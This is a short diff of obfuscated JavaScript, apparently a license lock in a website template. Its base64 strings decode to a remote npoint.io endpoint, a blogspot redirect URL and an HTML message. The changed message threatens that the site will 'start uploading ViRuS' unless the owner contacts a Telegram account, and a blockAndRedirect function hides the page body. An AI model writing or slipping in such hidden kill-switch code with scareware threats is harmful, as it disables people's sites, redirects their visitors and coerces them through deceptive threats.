@@ -1,8 +1,8 @@
 (function(){
 var a='aHR0cHM6Ly9hcGkubnBvaW50LmlvLzRmZTFhOWZlN2VkZTE1NmZlMDI3';
 var b=atob(a);
-var msg=atob('PGgxPllvdXIgbGljZW5zZSBpcyBpbnZhbGlkLCBQbGVhc2UgY29udGFjdCB1cyBodHRwczovL3RlbGVncmFtLm1lL2ppdDM2MjwvaDE+');
-var red=atob('aHR0cHM6Ly9zZ3U0dGVjaC5ibG9nc3BvdC5jb20=');
+var msg=atob('PGgxPllvdXIgTGljZW5zZSBpcyBub3QgdmFsaWQuIEltbWVkaWF0ZWx5IENvbnRhY3QgdG8gQEpJVDM2MiBPbiBUZWxlZ3JhbS4gaHR0cHM6Ly90ZWxlZ3JhbS5tZS9KSVQzNjIgIDxicj48YnI+RG9udCBSZWZyZXNoIFNpdGUgV2l0aG91dCBMaWNlbnNlIG9yIGl0IFN0YXJ0IHVwbG9hZGluZyBWaVJ1Uy48L2gxPg==');
+var red=atob('aHR0cHM6Ly90ZWNoeXNndS5ibG9nc3BvdC5jb20=');
 
 function blockAndRedirect(t){
 document.body.style.display='none';
